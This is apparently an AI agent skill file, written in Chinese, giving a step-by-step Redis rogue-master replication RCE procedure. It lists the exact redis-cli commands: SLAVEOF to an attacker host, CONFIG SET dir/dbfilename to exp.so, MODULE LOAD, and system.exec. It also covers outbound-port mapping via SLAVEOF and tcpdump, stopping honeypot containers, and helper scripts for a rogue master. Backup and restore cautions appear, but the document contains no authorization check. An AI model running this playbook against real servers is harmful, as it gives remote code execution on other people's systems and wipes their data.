---
name: redis-rogue-master-rce
description: Redis 主从复制 RCE 完整打法与生产数据安全纪律。打 6379/Redis 凭据时用。
version: 1.0.0
author: rem
license: MIT
metadata:
  hermes:
    tags: [pentest, redis, rce, rogue-master, data-safety]
    related_skills: [vuln-evidence-screenshots]
---

# Redis 主从复制 RCE（rogue master）打法

## When to Use

- 侦察发现 6379 开放 / 拿到 Redis 凭据（配置泄露、弱口令、未授权），需要升级成 RCE
- 需要 OOB 出站测绘（目标回连受限）时也可只取第四节单独用

## 一、适用判定（全部只读无害探针）

| 探针 | 目的 |
|---|---|
| `INFO server` | 版本（4.x/5.x 甜区）；`process_id:1` + 可执行文件路径异常（如 `/data/redis-server`）= 容器化 |
| `MODULE LIST` | 返回空列表=MODULE 未禁用；`unknown command`=被改名，路线死 |
| `SLAVEOF NO ONE` / `CONFIG SET hz 10`（设原值） | 验证两条关键命令未改名、可写 |
| `INFO keyspace` / `DBSIZE` | 备份规模评估 |
| `ROLE` | 确认 master 无附属 |

容器化 → cron/SSH 公钥/webshell 写盘流全无意义（容器无 crond/sshd/web 目录），只剩模块加载；RCE 落点在容器内，逃逸另算（查 docker.sock/特权/宿主挂载）。

## 二、⚠️ 数据消失机制（动手前必须懂）

全量重同步语义 = 从库变主库精确副本：payload 落盘 → **`emptyDb()` 清空全部 16 库** → `rdbLoad()` 解析。payload 是非法 RDB（ELF）→ 加载失败，但**清空先于解析**，数据已蒸发、模块文件已落盘。

**纪律：攻击前全量备份 → 打完恢复 → 逐库校验。** 缺备份直接打 = 生产事故。

## 三、攻击流程（实测于 2026-08，Redis 5.0.14 Alpine 容器）

1. 探针判定（第一节）
2. **全量备份**：`scripts/redis_backup.py <host> <port> <pass> <out.jsonl>`（pipelined SCAN+PTTL+DUMP，3.8 万键约 20s）
3. **出站测绘**（目标回连 rogue 是前提，见第四节）
4. rogue 上位：`scripts/rogue.py <listen_port> <exp.so路径>`（exp.so 用 n0b0dyCN/RedisModules-ExecuteCommand 系预编译，44,320B，适用 4.x/5.x）
5. 驱动（redis-cli 手动，天然支持 `-a` 认证）：
   ```
   CONFIG SET dir /data          # 按 CONFIG GET dir 实际值
   CONFIG SET dbfilename exp.so
   SLAVEOF <rogue_host> <port>
   MODULE LOAD /data/exp.so      # 等 2-4s 让 payload 落盘
   system.exec id                # 出 uid=xxx 即实锤
   ```
6. **清理**：`system.exec "rm -f /data/exp.so"` → `MODULE UNLOAD system` → `SLAVEOF NO ONE` → `CONFIG SET dbfilename dump.rdb`（还原原值）
7. **恢复**：`scripts/redis_restore.py <host> <port> <pass> <backup.jsonl>`（RESTORE REPLACE+TTL），keyspace 逐库对账

## 四、出站白名单测绘术（可复用到 SSRF/回连场景）

目标出站被安全组白名单拦截时，用**自有公网服务器抓 SYN** 权威测绘：

1. 服务器后台：`tcpdump -i any -nn 'host <目标IP> and tcp[tcpflags] & tcp-syn != 0' -w /tmp/syn.pcap`
2. 目标侧逐端口 `SLAVEOF <自有IP> <候选端口>`（每个 2-3s，`SLAVEOF NO ONE` 复位再换）
3. pcap 抓到 SYN 的端口 = 目标可出站；与自有服务器「SG 入站放行 ∧ 可绑定」端口求交集
4. 交集为空但目标能出 6379/3306 而自家这些端口被蜜罐/服务占 → `docker stop <蜜罐容器>` 暂借，打完 `docker start` 复原（分钟级，先确认无 watchdog 抢活）

## 五、坑（实测血泪）

- **pkill 自匹配自杀**：`pkill -f 'rogue.py'` 会连执行它的 ssh 远程 shell 一起杀（cmdline 含同款串）→ 方括号 trick：`pkill -f '[r]ogue.py'`
- **ssh 四层引号地狱**（local bash → ssh → zsh → redis-cli）：内层只用双引号不用单引号；zsh 变量不分词要 `${=VAR}`；`echo == xx ==` 触发 zsh `=cmd` 展开，分隔符换写法
- **MSYS 路径坑**：git-bash 调 Windows 原生 python/curl 时 `/c/...` 被拼成 `C:\c\...` 报 not found——一律 `C:/...`；curl.exe 输出路径同理
- **Windows 反斜杠被 bash 吃掉**：`python D:\tools\x.py` 经 bash 后 `\t\a` 转义路径全毁，统一正斜杠
- **MODULE LOAD 失败排查**：glibc 不兼容（预编译 so 太新）→ 按目标容器镜像重编；`Bad file format` = payload 没作为模块落盘（查 dbfilename/dir）
- **同步噪声**：payload 落盘后从库重连重试刷 rogue 日志，拿到 RCE 尽快 `SLAVEOF NO ONE`

## 支持文件

- `scripts/rogue.py` — 极简 rogue master（PING/REPLCONF/PSYNC 握手 + FULLRESYNC 送 exp.so）
- `scripts/redis_backup.py` — 全量逻辑备份（16 库 SCAN+PTTL+DUMP，pipelined，纯 socket 无依赖）
- `scripts/redis_restore.py` — 备份恢复（RESTORE REPLACE + TTL，逐库 DBSIZE 对账）
